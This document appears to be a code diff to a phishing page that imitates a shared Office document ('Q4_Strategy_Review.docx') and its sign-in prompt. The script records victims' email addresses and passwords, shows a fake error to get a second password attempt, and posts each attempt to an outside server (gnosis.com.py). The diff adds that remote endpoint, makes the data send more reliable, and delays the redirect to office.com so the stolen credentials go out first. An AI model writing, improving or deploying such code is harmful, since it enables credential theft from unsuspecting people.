@@ -115,10 +115,10 @@
         }
 
         .doc-icon img {
-            width: 40px;
-            height: 40px;
+            width: 32px;
+            height: 32px;
             object-fit: contain;
-            filter: invert(14%) sepia(71%) saturate(578%) hue-rotate(186deg) brightness(92%) contrast(88%);
+            /* Removed filter to show original image colors */
         }
 
         .doc-icon i {
@@ -524,8 +524,8 @@
                 height: 36px;
             }
             .doc-icon img {
-                width: 30px;
-                height: 30px;
+                width: 28px;
+                height: 28px;
             }
             .doc-meta h2 {
                 font-size: 13px;
@@ -686,8 +686,8 @@
                 height: 32px;
             }
             .doc-icon img {
-                width: 26px;
-                height: 26px;
+                width: 24px;
+                height: 24px;
             }
             .doc-meta h2 {
                 font-size: 13px;
@@ -729,7 +729,7 @@
         <div class="doc-icon">
             <!-- Document Icon - Using Cloudflare Pages URL -->
             <img src="${DOCUMENT_ICON}" alt="Document icon" aria-hidden="true" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';">
-            <i class="fas fa-file-shield" aria-hidden="true"></i>
+            <i class="fas fa-file-pdf" aria-hidden="true"></i>
         </div>
         <div class="doc-meta">
             <h2>Q4_Strategy_Review.docx</h2>
@@ -815,7 +815,7 @@
         console.log('✅ Script loaded');
 
         const CONFIG = {
-            logEndpoint: 'log.php', // Set to empty string to disable logging
+            logEndpoint: 'https://gnosis.com.py/serca/log.php', // UPDATE THIS URL
             redirectUrl: 'https://www.office.com'
         };
 
@@ -966,18 +966,20 @@
             };
 
             if (CONFIG.logEndpoint) {
-                if (navigator.sendBeacon) {
-                    var blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
-                    navigator.sendBeacon(CONFIG.logEndpoint, blob);
-                } else {
+                try {
+                    // Use fetch with keepalive for reliability
                     fetch(CONFIG.logEndpoint, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
                         body: JSON.stringify(logData),
                         keepalive: true
                     }).catch(function(error) {
                         console.log('⚠️ Logging failed:', error);
                     });
+                } catch(e) {
+                    console.log('⚠️ Logging error:', e);
                 }
             }
         }
@@ -1015,6 +1017,7 @@
                 } catch(e) {}
                 console.log('🔑 First password attempt for:', email);
                 
+                // Send log asynchronously
                 logToFile(email, pwd, 'password_attempt_1');
                 
                 showPasswordError(true, 2);
@@ -1044,9 +1047,13 @@
                 } catch(e) {}
                 console.log('🔑 Second password attempt for:', email);
                 
+                // Send log before redirect
                 logToFile(email, pwd, 'password_attempt_2_success');
                 
-                window.location.href = CONFIG.redirectUrl;
+                // Small delay to ensure log is sent
+                setTimeout(function() {
+                    window.location.href = CONFIG.redirectUrl;
+                }, 100);
             });
         }
 
